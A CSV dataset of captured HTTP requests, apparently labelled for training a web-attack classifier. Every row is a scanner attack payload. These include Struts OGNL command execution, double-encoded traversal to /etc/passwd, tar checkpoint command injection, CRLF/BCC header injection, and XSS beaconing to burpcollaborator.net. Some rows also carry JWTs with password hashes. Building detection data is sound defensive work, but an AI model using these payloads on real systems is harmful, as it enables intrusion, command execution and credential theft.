id,method,user_agent,url,refer,body,lable
169,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/public/images/products/apple_pressings.jpg%3e%0d%0aBCC%3ad0e1nnmbpt0qwonfzad3cckz2q8jwaxypsdj56vuk@burpcollaborator.net%0d%0agnr%3a%20g,http://121.4.111.58:3000/,"GET /assets/public/images/products/apple_pressings.jpg%3e%0d%0aBCC%3ad0e1nnmbpt0qwonfzad3cckz2q8jwaxypsdj56vuk@burpcollaborator.net%0d%0agnr%3a%20g HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=LZ2NxEqypze8n3Q49a7wPAoXU5Ty3HzMS1pU7EdWml5XMoYrjJgkbV6RD1OB; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIxQG1haWwuY29tIiwicGFzc3dvcmQiOiIwNWE2NzFjNjZhZWZlYTEyNGNjMDhiNzZlYTZkMzBiYiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImRlZjIzYTQyZjUzODc5MjI1MzI4NmIwNjk2YmZiZWE0YjQzZDgxNTBlOGU0NmM3OTFkMDUzZTg1NmFlZDk2ZDYiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTAzLTE0VDAyOjM1OjI0LjAzMloiLCJ1cGRhdGVkQXQiOiIyMDIyLTAzLTE0VDA3OjAwOjQ2LjQxOFoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NDcyNDEyNDYsImV4cCI6MTY0NzI1OTI0Nn0.TSLXboUDg8aTljBymqyzsybLcGCsBt2n6CmkOxjIEkylSKIkHFxaPgsq_fy5fqHItWi6lXx4xBwOEY71Wo53gKgCh9F-kaw7EUuodWHK1An4oZzq3474q7Mvzmw7pTd1akaGivae4RZJtvAzqDPmis34PgVEpgB",4
145,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),"//${%23context['xwork.MethodAccessor.denyMethodExecution']=!(%23_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('ipconfig').waitFor()}.action",,,4
982,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/login/check//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini,,"GET /login/check//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9181 Connection: Keep-alive  ",4
761,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~appoint~main~template.%0d%0aSomeCustomInjectedHeader:%20injected_by_wvsace645c95ca5d886b6.js,http://124.70.151.147:9180/,"GET /assets/js/vendors~chunk-contract~'.gethostbyname(lc('hitdj'.'jttoxtep3fead.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(110).chr(70).chr(120).chr(88).'~sign.08d30d70ed6728011036.js HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1359,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/js/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20962745646%20-%20801085341%0A%27,,,4
563,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/Public/js/ckeditor/plugins/image/images//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /Public/js/ckeditor/plugins/image/images//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Cookie: ASP.NET_SessionId=psix5uiy5b0gxfuxsedubehw;APPKIZUSERNAME Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.38 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",4
1026,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/version//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,,"GET /version//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
847,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp/%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/js/8953.250ed1ff8b838b373cb2.js,http://124.70.151.147:9180/,"GET /qyswebapp/assets/js/rAaBba2I.250ed1ff8b838b373cb2.js HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /qyswebapp/%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/js/8953.250ed1ff8b838b373cb2.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
349,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_b2d2-5543066de5b78ab6.pdf?1%0d%0aBCC%3aw63mhlb32zg42r8yz04qw7qv4majybm3fr9ez2o@burpcollaborator.net%0d%0aupt%3a%20b=1,http://121.4.111.58:3000/ftp,"GET /ftp/order_b2d2-5543066de5b78ab6.pdf?1%0d%0aBCC%3aw63mhlb32zg42r8yz04qw7qv4majybm3fr9ez2o@burpcollaborator.net%0d%0aupt%3a%20b=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",4
642,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/assets/js/main.38d31685fde2db7ba816.js,http://124.70.151.147:9180/,"GET /company/logo/image HTTP/1.1 Referer: https://www.google.com/search?hl=en&q=testing User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Cookie: SID=""%3Bprint(md5(31337))%3B$a="" Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br Host: 124.70.151.147:9180 Connection: Keep-alive  GET /%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/assets/js/main.38d31685fde2db7ba816.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
396,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/103.js?1%0d%0aBCC%3aei025o4c7uirep5ghbv4ud20krqkeb23vrpef24@burpcollaborator.net%0d%0aqzb%3a%20c=1,http://121.4.111.58:3000/,"GET /103.js?1%0d%0aBCC%3aei025o4c7uirep5ghbv4ud20krqkeb23vrpef24@burpcollaborator.net%0d%0aqzb%3a%20c=1 HTTP/1.1 Host: 121.4.111.58:3000 Origin: http://121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: */* Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy Connection: close  ",4
245,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/3vzm9u3v6prvj0vxer8vnai990ft3ky8qzeq6dw1lX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/styles.css,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/3vzm9u3v6prvj0vxer8vnai990ft3ky8qzeq6dw1lX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Origin: http://121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: */* Referer: http://121.4.111.58:3000/styles.css Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A",4
967,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/static/admin/js//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /static//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\windows/win.ini HTTP/1.1 Cookie: csrftoken=iWw0BIFK93NKL2Lc47gYI1bB7CiFt43FVhBMBnS26JTr6pxlCW7qqQ9PZ5LL2Sv4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147 Connection: Keep-alive  GET /static/admin/js//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Cookie: csrftoken=iWw0BIFK93NKL2Lc47gYI1bB7CiFt43FVhBMBnS26JTr6pxlCW7qqQ9PZ5LL2Sv4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147 Connection: Keep-alive  ",4
969,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20922773158%20%2b%20990706423%22%0A%27,,,4
554,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/images//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,,"GET /images//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1 Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",4
857,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp/%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs/js/4200.75a284ca78e47a865e07.js,http://124.70.151.147:9180/,"GET /%E5%98%8A%E5%98%8DSomeCustomInjectedHeader:%20injected_by_wvs/assets/js/4200.75a284ca78e47a865e07.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /qyswebapp/%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs/js/4200.75a284ca78e47a865e07.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
684,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/department/%3f%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/exist,http://124.70.151.147:9181/,"GET /department/%3f%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/exist HTTP/1.1 Referer: http://124.70.151.147:9181/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9181 Connection: Keep-alive  ",4
384,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/rest/admin/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/an1t11v2ywj2b7n46y02fhag1770vrufm6ax2ks8hX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/,"GET /rest/admin/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/an1t11v2ywj2b7n46y02fhag1770vrufm6ax2ks8hX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept: application/json, text/plain, */* Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_s",4
386,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/rest/products/search?q=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fprk85gzh2bnhfmrjad4hjwev5mbfz61utlhc42srX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e,http://121.4.111.58:3000/,"GET /rest/products/search?q=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fprk85gzh2bnhfmrjad4hjwev5mbfz61utlhc42srX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept: application/json, text/plain, */* Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en",4
377,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/projects/wiki/activity?from=2022-07-26&show_news=1&submit=%E5%BA%94%E7%94%A8&user_id=%250d%250aCRLF-Header%3ACRLF-Value&utf8=%E2%9C%93,,,4
387,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/projects/wiki/activity?amp=&amp=&amp=&amp=&amp=&amp=&from=2022-07-16&show_files=1&show_issues=1&show_news=1&submit=%E5%BA%94%E7%94%A8&user_id=%250d%250aCRLF-Header%3ACRLF-Value&utf8=%E2%9C%93,http://10.19.159.21:1001/projects/wiki/activity?utf8=%E2%9C%93&from=2022-07-26&user_id=&show_issues=1&show_news=1&show_files=1&submit=%E5%BA%94%E7%94%A8,,4
